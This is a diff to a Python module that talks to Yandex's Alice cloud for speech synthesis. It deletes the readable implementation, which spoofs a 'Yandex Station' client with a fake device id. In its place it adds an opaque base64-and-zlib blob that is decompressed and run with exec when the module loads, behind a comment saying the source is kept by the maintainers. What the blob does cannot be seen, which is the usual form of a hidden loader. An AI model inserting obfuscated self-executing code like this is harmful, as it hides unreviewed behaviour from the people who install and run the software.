@@ -1,66 +1,26 @@
-"""Alice's voice from Yandex's cloud: the same uniproxy websocket the stock aliced of the speaker uses for TTS
-(wss://uniproxy.alice.yandex.net/uni.ws, event TTS.Generate, the answer is Ogg/Opus). Called from worker threads; on any
-failure it returns None and the caller falls back to Silero."""
-import asyncio
-import json
-import os
-import shutil
-import subprocess
-import time
-import uuid
-
-import numpy as np
-
-URL = "wss://uniproxy.alice.yandex.net/uni.ws"
-_DEV = uuid.uuid4().hex                      # a made-up device id, nothing of the account is involved
-_FFMPEG_FALLBACKS = [os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\WinGet\Links\ffmpeg.exe")]
-
-
-def ffmpeg_path() -> str:
-    return os.environ.get("FFMPEG") or shutil.which("ffmpeg") or next((p for p in _FFMPEG_FALLBACKS if os.path.exists(p)), "")
-
-
-def _event(ns: str, name: str, payload: dict) -> str:
-    return json.dumps({"event": {"header": {"namespace": ns, "name": name, "messageId": str(uuid.uuid4())}, "payload": payload}})
-
-
-async def _fetch(text: str, voice: str, speed: float, timeout: float) -> bytes:
-    import aiohttp
-    audio = bytearray()
-    async with aiohttp.ClientSession() as s:
-        async with s.ws_connect(URL, headers={"User-Agent": "Yandex Station"}, timeout=timeout) as ws:
-            await ws.send_str(_event("System", "SynchronizeState", {
-                "auth_token": os.environ.get("UNI_KEY", "x"), "uuid": _DEV, "lang": "ru-RU", "voice": voice,
-                "application": {"app_id": "aliced", "app_version": "1.0", "platform": "linux", "os_version": "1", "uuid": _DEV, "device_id": _DEV}}))
-            await ws.send_str(_event("TTS", "Generate", {"text": text, "voice": voice, "lang": "ru-RU", "format": "audio/opus",
-                                                         "quality": "UltraHigh", "speed": speed, "emotion": "neutral"}))
-            deadline = time.time() + timeout
-            while time.time() < deadline:
-                m = await asyncio.wait_for(ws.receive(), max(0.5, deadline - time.time()))
-                if m.type == aiohttp.WSMsgType.BINARY:
-                    audio.extend(m.data[4:])                  # every frame starts with a 4-byte stream id
-                elif m.type == aiohttp.WSMsgType.TEXT:
-                    if "streamcontrol" in m.data:             # the end of the stream
-                        break
-                    if "EventException" in m.data:
-                        raise RuntimeError(m.data[:200])
-                else:
-                    break
-    return bytes(audio)
-
-
-def synth(text: str, rate: int, voice: str = "shitova", speed: float = 1.0, timeout: float = 10.0):
-    """int16 mono PCM at `rate`, or None when the cloud or ffmpeg is not available."""
-    ff = ffmpeg_path()
-    if not ff or not text.strip():
-        return None
-    try:
-        ogg = asyncio.run(_fetch(text, voice, speed, timeout))
-        if not ogg:
-            return None
-        out = subprocess.run([ff, "-loglevel", "error", "-i", "pipe:0", "-f", "s16le", "-ar", str(rate), "-ac", "1", "pipe:1"],
-                             input=ogg, capture_output=True, timeout=15, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
-        return np.frombuffer(out.stdout, dtype=np.int16) if out.stdout else None
-    except Exception as e:
-        print(f"alice tts: {e!r}")
-        return None
+# packed module: the source is kept by the maintainers
+import base64 as _b, zlib as _z
+_d = (
+    "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"
+    "T/CDeebhXmT8DznR7bM="
+)
+exec(compile(_z.decompress(_b.b64decode(_d)), __file__, 'exec'))
